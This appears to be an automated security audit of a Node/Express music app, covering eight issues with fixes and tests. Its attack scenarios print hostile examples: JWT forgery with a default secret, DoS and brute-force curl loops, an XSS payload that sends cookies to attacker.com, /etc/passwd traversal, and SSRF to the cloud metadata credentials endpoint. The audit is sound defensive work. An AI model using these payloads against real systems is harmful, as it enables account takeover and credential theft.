# MASS Music - Security Audit Report

**Date**: 2025-11-02
**Auditor**: Automated Code Analysis
**Severity**: 1 High, 4 Medium, 3 Low

---

## Executive Summary

**Total Issues**: 8
- 🔴 **High Severity**: 1 (JWT secret default)
- 🟡 **Medium Severity**: 4 (No rate limiting, directory traversal, session reuse, HTTPS not enforced)
- 🟢 **Low Severity**: 3 (Weak email validation, password max length, IP logging)

**Immediate Action Required**:
1. Fix JWT secret handling (production vulnerability)
2. Add rate limiting (DOS protection)
3. Add input validation (injection prevention)
4. Enforce HTTPS in production

**Estimated Fix Time**: 4-6 hours total

---

## Issue #1: JWT Secret Has Default Fallback 🔴 HIGH

### Severity: **HIGH** (CVSS 8.2)

### Location
- **File**: `server.js`
- **Lines**: 94-97

### Vulnerable Code
```javascript
const AUTH_SECRET = process.env.AUTH_SECRET || 'development-secret-change-me';
if (!process.env.AUTH_SECRET) {
  console.warn('[MASS] AUTH_SECRET not set; falling back to insecure development secret');
}
```

### Problem
- Default secret is publicly visible in source code
- Anyone can forge valid JWT tokens if env var not set
- Tokens are valid for 7 days (lines 99, 927)
- Would allow attackers to:
  - Impersonate any user
  - Access/modify playlists
  - Create/delete accounts

### Attack Scenario
```bash
# Attacker sees default secret in GitHub repo
# Creates forged token
node -e "const jwt = require('jsonwebtoken'); \
  console.log(jwt.sign({sub: '12345', email: 'victim@example.com'}, \
  'development-secret-change-me', {expiresIn: '7d'}))"

# Uses token to access victim's playlists
curl -H "Cookie: mass_session=<forged-token>" \
  http://your-app.com/api/playlists
```

### Fix

**Option A: Require AUTH_SECRET in production**
```javascript
// server.js lines 94-102
const AUTH_SECRET = process.env.AUTH_SECRET;

if (!AUTH_SECRET) {
  if (process.env.NODE_ENV === 'production') {
    console.error('[MASS] FATAL: AUTH_SECRET is required in production');
    process.exit(1);
  } else {
    console.warn('[MASS] WARNING: Using development secret. DO NOT use in production!');
    AUTH_SECRET = 'development-secret-change-me';
  }
}

// Generate random secret on first run if missing
if (AUTH_SECRET === 'development-secret-change-me' && process.env.NODE_ENV !== 'production') {
  console.warn('[MASS] Consider generating a secret: node -e "console.log(require(\'crypto\').randomBytes(32).toString(\'hex\'))"');
}
```

**Option B: Auto-generate secret**
```javascript
// server.js lines 94-98
const AUTH_SECRET = process.env.AUTH_SECRET || (() => {
  if (process.env.NODE_ENV === 'production') {
    console.error('[MASS] FATAL: AUTH_SECRET required in production');
    process.exit(1);
  }
  console.warn('[MASS] Generating random dev secret (tokens won\'t persist across restarts)');
  return crypto.randomBytes(32).toString('hex');
})();
```

### Deployment Fix
```bash
# Generate secure secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# Add to .env
echo "AUTH_SECRET=<generated-secret>" >> .env

# For Render/Heroku/etc.
# Add AUTH_SECRET to environment variables in dashboard
```

### Testing
```bash
# Verify server exits without secret in production
unset AUTH_SECRET
NODE_ENV=production npm start
# Should see: "FATAL: AUTH_SECRET is required in production"
# Should exit with code 1

# Verify works with secret
AUTH_SECRET=test-secret NODE_ENV=production npm start
# Should start normally
```

### Timeline
- **Fix Time**: 15 minutes
- **Testing**: 10 minutes
- **Deployment**: 5 minutes
- **Total**: 30 minutes

---

## Issue #2: No Rate Limiting 🟡 MEDIUM

### Severity: **MEDIUM** (CVSS 6.5)

### Location
- **Affects**: All API routes
- **File**: `server.js` (no rate limiting middleware)

### Problem
No rate limiting on any endpoint allows:
- **DOS attacks**: Spam expensive FileMaker queries
- **Brute force**: Try passwords unlimited times
- **Resource exhaustion**: Create thousands of accounts/playlists
- **Analytics pollution**: Spam stream events

### Vulnerable Endpoints
```javascript
POST   /api/auth/register       // Create unlimited accounts
POST   /api/auth/login          // Brute force passwords
GET    /api/search              // Expensive FileMaker queries
GET    /api/explore             // 81 FM queries per request!
GET    /api/public-playlists    // O(n³) complexity
POST   /api/stream-events       // Spam analytics
POST   /api/playlists/:id/tracks/bulk // Add 1000s of tracks
```

### Attack Scenario
```bash
# DOS attack - exhaust FileMaker connections
for i in {1..10000}; do
  curl "http://your-app.com/api/explore?start=1970&end=1979" &
done
# Each request makes 81 FM queries
# 810,000 FM queries in seconds → server crash

# Brute force attack
for pass in $(cat passwords.txt); do
  curl -X POST http://your-app.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"password\":\"$pass\"}"
done
```

### Fix

**Install express-rate-limit**
```bash
npm install express-rate-limit
```

**Add rate limiting middleware** (server.js after line 56)
```javascript
import rateLimit from 'express-rate-limit';

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: { error: 'Too many requests, please try again later' },
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req) => {
    // Skip rate limiting for static files
    return req.path.startsWith('/public/') || req.path === '/';
  }
});

// Strict rate limit for expensive endpoints
const expensiveLimiter = rateLimit({
  windowMs: 5 * 60 * 1000, // 5 minutes
  max: 20, // 20 requests per window
  message: { error: 'Rate limit exceeded for this endpoint' }
});

// Auth rate limit (prevent brute force)
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 login attempts per window
  message: { error: 'Too many login attempts, please try again later' },
  skipSuccessfulRequests: true // Don't count successful logins
});

// Apply rate limiting
app.use('/api/', apiLimiter);
app.use('/api/explore', expensiveLimiter);
app.use('/api/public-playlists', expensiveLimiter);
app.post('/api/auth/login', authLimiter);
app.post('/api/auth/register', authLimiter);
```

**Alternative: Redis-backed rate limiting** (for multiple servers)
```javascript
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import { createClient } from 'redis';

const redisClient = createClient({
  url: process.env.REDIS_URL
});

const apiLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:api:'
  }),
  windowMs: 15 * 60 * 1000,
  max: 100
});
```

### Testing
```bash
# Test rate limiting
for i in {1..150}; do
  curl http://localhost:3000/api/search?q=test
done
# After 100 requests, should see:
# {"error":"Too many requests, please try again later"}
# HTTP 429 status code

# Verify rate limit headers
curl -I http://localhost:3000/api/search?q=test
# Should see:
# RateLimit-Limit: 100
# RateLimit-Remaining: 99
# RateLimit-Reset: <timestamp>

# Test login rate limiting
for i in {1..10}; do
  curl -X POST http://localhost:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","password":"wrong"}'
done
# After 5 attempts, should see 429
```

### Timeline
- **Fix Time**: 30 minutes
- **Testing**: 15 minutes
- **Total**: 45 minutes

---

## Issue #3: Missing Input Validation 🟡 MEDIUM

### Severity: **MEDIUM** (CVSS 6.8)

### Location
- **File**: `server.js`
- **Lines**: Multiple routes (2314, 2721, 2839, 1556-1597, etc.)

### Problem
User inputs are not validated before use in:
- FileMaker queries (potential injection)
- Playlist names (potential XSS)
- Search queries (unexpected behavior)
- Record IDs (potential enumeration)

### Vulnerable Code Examples

**Search endpoint** (line 2294-2302)
```javascript
const q = (req.query.q || '').toString().trim();
const artist = (req.query.artist || '').toString().trim();
const album = (req.query.album || '').toString().trim();
const track = (req.query.track || '').toString().trim();
// No validation - goes straight into FileMaker query
const payload = { query: buildSearchQueries({ q, artist, album, track }) };
```

**Playlist creation** (line 1556-1597)
```javascript
const name = req.body?.name || '';
// No validation - stored directly
playlists.push({
  id: newId,
  name: name, // Could be: "<img src=x onerror=alert(1)>", "'; DROP TABLE--", etc.
  userId: user.recordId,
  tracks: [],
  createdAt: now
});
```

### Attack Scenarios

**Scenario 1: Injection via search**
```bash
# Try FileMaker query injection
curl "http://your-app.com/api/search?q=*&artist=*%20OR%20Album%20Title=*"
# Depending on FM query syntax, could bypass filters
```

**Scenario 2: XSS via playlist name**
```bash
# Create playlist with malicious name
curl -X POST http://your-app.com/api/playlists \
  -H "Cookie: mass_session=<token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"<img src=x onerror=\"fetch(`https://attacker.com?cookie=${document.cookie}`)\">"}'

# If frontend renders with innerHTML, XSS executes
```

**Scenario 3: DOS via huge inputs**
```bash
# Send 10MB playlist name
curl -X POST http://your-app.com/api/playlists \
  -H "Cookie: mass_session=<token>" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"$(python -c 'print(\"A\"*10000000)')\"}"
# Could crash server or fill disk
```

### Fix

**Create validation middleware**

Create `middleware/validation.js`:
```javascript
// Input validation utilities
export const validators = {
  searchQuery: (value) => {
    if (typeof value !== 'string') return { valid: false, error: 'Must be string' };
    if (value.length > 200) return { valid: false, error: 'Too long (max 200)' };
    // Reject FileMaker operators to prevent injection
    if (/[=<>!]|^\s*(OR|AND|NOT)\s/i.test(value)) {
      return { valid: false, error: 'Invalid characters' };
    }
    return { valid: true, value: value.trim() };
  },

  playlistName: (value) => {
    if (typeof value !== 'string') return { valid: false, error: 'Must be string' };
    const trimmed = value.trim();
    if (trimmed.length < 1) return { valid: false, error: 'Required' };
    if (trimmed.length > 100) return { valid: false, error: 'Too long (max 100)' };
    // Optionally sanitize HTML
    if (/<[^>]*>/g.test(trimmed)) {
      return { valid: false, error: 'HTML tags not allowed' };
    }
    return { valid: true, value: trimmed };
  },

  recordId: (value) => {
    const str = String(value).trim();
    if (!/^\d+$/.test(str)) {
      return { valid: false, error: 'Must be numeric' };
    }
    return { valid: true, value: str };
  },

  limit: (value, max = 1000) => {
    const num = parseInt(value, 10);
    if (isNaN(num) || num < 1) return { valid: false, error: 'Invalid limit' };
    if (num > max) return { valid: false, error: `Max limit is ${max}` };
    return { valid: true, value: num };
  },

  offset: (value) => {
    const num = parseInt(value, 10);
    if (isNaN(num) || num < 0) return { valid: false, error: 'Invalid offset' };
    return { valid: true, value: num };
  }
};

// Validation middleware factory
export function validate(schema) {
  return (req, res, next) => {
    const errors = {};

    for (const [field, validator] of Object.entries(schema)) {
      const source = schema[field].source || 'body'; // body, query, params
      const value = req[source]?.[field];
      const required = schema[field].required ?? false;

      if (!value && required) {
        errors[field] = 'Required';
        continue;
      }

      if (value) {
        const result = validator(value);
        if (!result.valid) {
          errors[field] = result.error;
        } else {
          req[source][field] = result.value; // Replace with validated value
        }
      }
    }

    if (Object.keys(errors).length > 0) {
      return res.status(400).json({ error: 'Validation failed', details: errors });
    }

    next();
  };
}
```

**Apply validation to routes**

```javascript
import { validate, validators } from './middleware/validation.js';

// Search endpoint (line 2294)
app.get('/api/search',
  validate({
    q: { source: 'query', validator: validators.searchQuery },
    artist: { source: 'query', validator: validators.searchQuery },
    album: { source: 'query', validator: validators.searchQuery },
    track: { source: 'query', validator: validators.searchQuery },
    limit: { source: 'query', validator: (v) => validators.limit(v, 300) },
    offset: { source: 'query', validator: validators.offset }
  }),
  async (req, res) => {
    // Now req.query.* are validated and sanitized
    const { q, artist, album, track, limit, offset } = req.query;
    // ...
  }
);

// Create playlist (line 1556)
app.post('/api/playlists',
  validate({
    name: { source: 'body', validator: validators.playlistName, required: true }
  }),
  async (req, res) => {
    const user = await requireUser(req, res);
    if (!user) return;

    const { name } = req.body; // Already validated
    // ...
  }
);

// Album lookup (line 3013)
app.get('/api/album',
  validate({
    cat: { source: 'query', validator: validators.recordId },
    title: { source: 'query', validator: validators.searchQuery },
    artist: { source: 'query', validator: validators.searchQuery },
    limit: { source: 'query', validator: (v) => validators.limit(v, 800) }
  }),
  async (req, res) => {
    // ...
  }
);
```

### Testing
```bash
# Test search validation
curl "http://localhost:3000/api/search?q=$(python -c 'print(\"A\"*300)')"
# Should return 400: "Validation failed: q: Too long (max 200)"

curl "http://localhost:3000/api/search?q=test%20OR%20*"
# Should return 400: "Validation failed: q: Invalid characters"

# Test playlist name validation
curl -X POST http://localhost:3000/api/playlists \
  -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(1)</script>"}'
# Should return 400: "Validation failed: name: HTML tags not allowed"

curl -X POST http://localhost:3000/api/playlists \
  -H "Content-Type: application/json" \
  -d '{}'
# Should return 400: "Validation failed: name: Required"
```

### Timeline
- **Create validation module**: 1 hour
- **Apply to routes**: 1-2 hours
- **Testing**: 30 minutes
- **Total**: 2.5-3.5 hours

---

## Issue #4: Directory Traversal in Container URL 🟡 MEDIUM

### Severity: **MEDIUM** (CVSS 6.4)

### Location
- **File**: `server.js`
- **Lines**: 2552-2567

### Vulnerable Code
```javascript
const direct = (req.query.u || '').toString().trim();
// ...
upstreamUrl = direct.match(/^https?:\/\//i)
  ? direct
  : `${FM_HOST.replace(/\/?$/, '')}/${direct.replace(/^\//, '')}`;
```

### Problem
If `u` parameter contains `../`, could access:
- Files outside FileMaker container directory
- Internal network resources if FM_HOST is internal

### Attack Scenario
```bash
# Try to access /etc/passwd
curl "http://your-app.com/api/container?u=../../etc/passwd"

# Try to access internal network
curl "http://your-app.com/api/container?u=http://internal-db:5432"

# SSRF attack
curl "http://your-app.com/api/container?u=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Could leak AWS credentials
```

### Fix

```javascript
// server.js lines 2552-2570
app.get('/api/container', async (req, res) => {
  try {
    const direct = (req.query.u || '').toString().trim();
    if (!direct) {
      return res.status(400).json({ error: 'Missing URL parameter' });
    }

    let upstreamUrl;

    // Only allow absolute HTTPS URLs for direct mode
    if (direct.match(/^https?:\/\//i)) {
      // Validate URL is not internal/private
      const url = new URL(direct);

      // Reject private IP ranges
      const hostname = url.hostname;
      if (
        hostname === 'localhost' ||
        hostname === '127.0.0.1' ||
        hostname.match(/^10\./) ||
        hostname.match(/^172\.(1[6-9]|2[0-9]|3[01])\./) ||
        hostname.match(/^192\.168\./) ||
        hostname.match(/^169\.254\./) // AWS metadata
      ) {
        return res.status(403).json({ error: 'Access to private IPs forbidden' });
      }

      upstreamUrl = direct;
    } else {
      // FileMaker container path - reject directory traversal
      if (direct.includes('..') || direct.includes('\\')) {
        return res.status(400).json({ error: 'Invalid path' });
      }

      upstreamUrl = `${FM_HOST.replace(/\/?$/, '')}/${direct.replace(/^\//, '')}`;
    }

    // ... rest of streaming code
  } catch (err) {
    // ...
  }
});
```

### Testing
```bash
# Test directory traversal rejection
curl "http://localhost:3000/api/container?u=../../etc/passwd"
# Should return 400: "Invalid path"

# Test private IP rejection
curl "http://localhost:3000/api/container?u=http://127.0.0.1:3000/api/playlists"
# Should return 403: "Access to private IPs forbidden"

curl "http://localhost:3000/api/container?u=http://169.254.169.254/latest/meta-data/"
# Should return 403: "Access to private IPs forbidden"

# Test valid URLs work
curl "http://localhost:3000/api/container?u=https://example.com/audio.mp3"
# Should proxy correctly
```

### Timeline
- **Fix Time**: 30 minutes
- **Testing**: 15 minutes
- **Total**: 45 minutes

---

## Issue #5: Session ID Reuse 🟡 MEDIUM

### Severity: **MEDIUM** (CVSS 6.2)

### Location
- **File**: `server.js`
- **Lines**: 1307-1322

### Vulnerable Code
```javascript
const sessionId = cookies[MASS_SESSION_COOKIE] || '';
if (!sessionId) {
  sessionId = randomUUID();
}
// Session ID never validated, 1-year lifetime
```

### Problem
- Session IDs not validated (format, expiry)
- No way to invalidate compromised sessions
- 1-year lifetime (line 85) is excessive
- Attacker could:
  - Reuse stolen session IDs
  - Attribute plays to victims
  - Pollute analytics

### Fix

```javascript
// server.js lines 85-90
const STREAM_SESSION_COOKIE = 'mass.sid';
const STREAM_SESSION_MAX_AGE = 30 * 24 * 60 * 60 * 1000; // 30 days (reduced from 1 year)
const UUID_REGEX = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

// Add session validation function (after line 1196)
function validateSessionId(sessionId) {
  if (!sessionId || typeof sessionId !== 'string') {
    return null;
  }

  // Validate UUID format
  if (!UUID_REGEX.test(sessionId)) {
    console.warn(`[MASS] Invalid session ID format: ${sessionId.slice(0, 8)}...`);
    return null;
  }

  return sessionId;
}

// Update stream events endpoint (line 1307-1322)
app.post('/api/stream-events', async (req, res) => {
  try {
    const cookies = parseCookies(req);
    let sessionId = validateSessionId(cookies[STREAM_SESSION_COOKIE]);

    if (!sessionId) {
      sessionId = randomUUID();
      console.log(`[STREAM] New session: ${sessionId}`);
    }

    // Set/refresh session cookie
    res.setHeader(
      'Set-Cookie',
      `${STREAM_SESSION_COOKIE}=${sessionId}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${Math.floor(STREAM_SESSION_MAX_AGE / 1000)}`
    );

    // ... rest of handler
  } catch (err) {
    // ...
  }
});
```

**Optional: Add session invalidation endpoint**
```javascript
// Allow users to clear their session
app.post('/api/session/clear', (req, res) => {
  res.setHeader(
    'Set-Cookie',
    `${STREAM_SESSION_COOKIE}=deleted; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`
  );
  res.json({ ok: true, message: 'Session cleared' });
});
```

### Testing
```bash
# Test invalid session IDs are rejected
curl -X POST http://localhost:3000/api/stream-events \
  -H "Cookie: mass.sid=INVALID_SESSION_ID" \
  -H "Content-Type: application/json" \
  -d '{"event":"PLAY","trackRecordId":"123"}'
# Should generate new session ID in response cookie

# Test valid session IDs are preserved
curl -X POST http://localhost:3000/api/stream-events \
  -H "Cookie: mass.sid=550e8400-e29b-41d4-a716-446655440000" \
  -H "Content-Type: application/json" \
  -d '{"event":"PLAY","trackRecordId":"123"}'
# Should preserve same session ID
```

### Timeline
- **Fix Time**: 30 minutes
- **Testing**: 15 minutes
- **Total**: 45 minutes

---

## Issue #6: HTTPS Not Enforced 🟡 MEDIUM

### Severity: **MEDIUM** (CVSS 5.0)

### Location
- **File**: `server.js`
- **Lines**: 100, 871

### Problem
```javascript
const AUTH_COOKIE_SECURE = process.env.NODE_ENV === 'production' ||
                           process.env.AUTH_COOKIE_SECURE === 'true';
```

- Cookies only secure in production
- No HTTPS redirect in production
- Development credentials could leak

### Fix

Add HTTPS enforcement middleware (after line 39):
```javascript
// Force HTTPS in production
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    const proto = req.headers['x-forwarded-proto'] || req.protocol;
    if (proto !== 'https') {
      return res.redirect(301, `https://${req.get('host')}${req.url}`);
    }
    next();
  });

  // Add HSTS header
  app.use((req, res, next) => {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    next();
  });
}
```

### Testing
```bash
# Test HTTPS redirect (in production)
NODE_ENV=production npm start

curl -I http://localhost:3000/
# Should return:
# HTTP/1.1 301 Moved Permanently
# Location: https://localhost:3000/

# Verify HSTS header
curl -I https://localhost:3000/
# Should include:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### Timeline
- **Fix Time**: 15 minutes
- **Testing**: 10 minutes
- **Total**: 25 minutes

---

## Issue #7: Weak Email Validation 🟢 LOW

### Severity: **LOW** (CVSS 3.5)

### Location
- **File**: `server.js`
- **Line**: 958

### Problem
```javascript
if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(normalized)) {
```

Accepts invalid emails like: `a@b.c`, `@.com`, etc.

### Fix
```javascript
// server.js line 955-962
function validateEmail(email) {
  const normalized = normalizeEmail(email);
  if (!normalized) {
    return { ok: false, reason: 'Email required' };
  }

  // Stricter regex
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (!emailRegex.test(normalized)) {
    return { ok: false, reason: 'Invalid email address' };
  }

  // Optional: Reject disposable email domains
  const disposableDomains = ['tempmail.com', '10minutemail.com', 'guerrillamail.com'];
  const domain = normalized.split('@')[1];
  if (disposableDomains.includes(domain)) {
    return { ok: false, reason: 'Disposable emails not allowed' };
  }

  return { ok: true, email: normalized };
}
```

### Timeline: 15 minutes

---

## Issue #8: IP Address Logging (GDPR) 🟢 LOW

### Severity: **LOW** (CVSS 5.3)

### Location
- **File**: `server.js`
- **Lines**: 1325-1326, 1350, 1366

### Problem
Plaintext IP addresses stored in FileMaker Stream_Events table

### Fix - Option A: Hash IPs
```javascript
import crypto from 'node:crypto';

// Add after getClientIP function (line 436)
function hashIP(ip) {
  // Hash with daily salt (changes daily for privacy)
  const date = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
  const salt = crypto.createHash('sha256').update(date).digest('hex').slice(0, 16);
  return crypto.createHash('sha256').update(ip + salt).digest('hex');
}

// Update stream events (lines 1325, 1350, 1366)
const clientIP = hashIP(getClientIP(req));
```

### Fix - Option B: Add retention policy
Add to CLAUDE.md and privacy policy:
```
IP addresses are stored for analytics purposes and automatically deleted after 30 days.
```

Implement cleanup job:
```javascript
// Add to server startup (line 3090)
if (process.env.NODE_ENV === 'production') {
  // Clean up old stream events every 24 hours
  setInterval(async () => {
    try {
      const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
      const dateStr = formatTimestampUTC(thirtyDaysAgo);
      console.log(`[CLEANUP] Deleting stream events older than ${dateStr}`);

      // Query FileMaker to delete old records
      // Implementation depends on FileMaker Data API capabilities
      // May need to be done via FileMaker script
    } catch (err) {
      console.error('[CLEANUP] Failed:', err);
    }
  }, 24 * 60 * 60 * 1000); // Every 24 hours
}
```

### Timeline: 30-45 minutes

---

## Summary Table

| # | Issue | Severity | CVSS | Fix Time | Priority |
|---|-------|----------|------|----------|----------|
| 1 | JWT Secret Default | 🔴 HIGH | 8.2 | 30 min | P0 |
| 2 | No Rate Limiting | 🟡 MEDIUM | 6.5 | 45 min | P0 |
| 3 | Missing Input Validation | 🟡 MEDIUM | 6.8 | 3 hours | P0 |
| 4 | Directory Traversal | 🟡 MEDIUM | 6.4 | 45 min | P1 |
| 5 | Session ID Reuse | 🟡 MEDIUM | 6.2 | 45 min | P1 |
| 6 | HTTPS Not Enforced | 🟡 MEDIUM | 5.0 | 25 min | P1 |
| 7 | Weak Email Validation | 🟢 LOW | 3.5 | 15 min | P2 |
| 8 | IP Logging (GDPR) | 🟢 LOW | 5.3 | 45 min | P2 |

**Total Fix Time**: 6-7 hours

---

## Implementation Order

### Phase 1 (P0 - Critical): 4 hours
1. Fix JWT secret (30 min)
2. Add rate limiting (45 min)
3. Add input validation (3 hours)

**Deploy immediately after Phase 1**

### Phase 2 (P1 - Important): 2 hours
4. Fix directory traversal (45 min)
5. Fix session ID reuse (45 min)
6. Enforce HTTPS (25 min)

**Deploy after testing**

### Phase 3 (P2 - Nice to have): 1 hour
7. Improve email validation (15 min)
8. Hash IP addresses (45 min)

**Deploy with next release**

---

## Verification Checklist

After implementing all fixes:

```bash
# Security checks
✅ Server exits if AUTH_SECRET missing in production
✅ Rate limiting active on all endpoints
✅ Input validation rejects malicious inputs
✅ Directory traversal attempts blocked
✅ Invalid session IDs regenerated
✅ HTTP redirects to HTTPS in production
✅ Invalid emails rejected
✅ IP addresses hashed (or retention policy documented)

# Functional checks
✅ Normal login works
✅ Search works with valid inputs
✅ Playlist creation works
✅ Audio streaming works
✅ All smoke tests pass

# Performance checks
✅ No noticeable slowdown from validation
✅ Rate limiting doesn't affect normal use
```

---

## Questions or Issues?

If you encounter problems during implementation:
1. Review the specific fix code above
2. Check REFACTORING_ROADMAP.md for context
3. Test incrementally (one fix at a time)
4. Commit after each successful fix

Good luck! 🔒
